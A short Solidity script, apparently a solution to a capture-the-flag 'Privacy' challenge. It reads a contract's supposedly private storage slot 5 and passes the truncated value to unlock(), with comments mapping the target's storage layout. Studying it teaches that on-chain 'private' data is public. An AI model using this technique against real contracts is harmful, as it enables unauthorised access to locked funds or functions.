// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.s.sol";

contract PrivacyAttack is Broadcasted {
    uint256 internal constant STORAGE_SLOT = 5;

    function attack(address payable privacyCtr_) public payable override {
        bytes32 key = vm.load(privacyCtr_, bytes32(uint256(STORAGE_SLOT)));
        IPrivacy(privacyCtr_).unlock(bytes16(key));
    }
}

interface IPrivacy {
    //! storage positions
    /**
     * bool public locked = true;                              //! slot 0
     * uint256 public ID = block.timestamp;                    //! slot 1
     * uint8 private flattening = 10;                          //! slot 2
     * uint8 private denomination = 255;                       //! slot 2
     * uint16 private awkwardness = uint16(block.timestamp);   //! slot 2
     * bytes32[3] private data;                                //! data[0] slot 3
     * .                                                       //! data[1] slot 4
     * .                                                       //! data[2] slot 5
     */
    // ! the needed slot to get the key is 5
    function unlock(bytes16 _key) external;
}
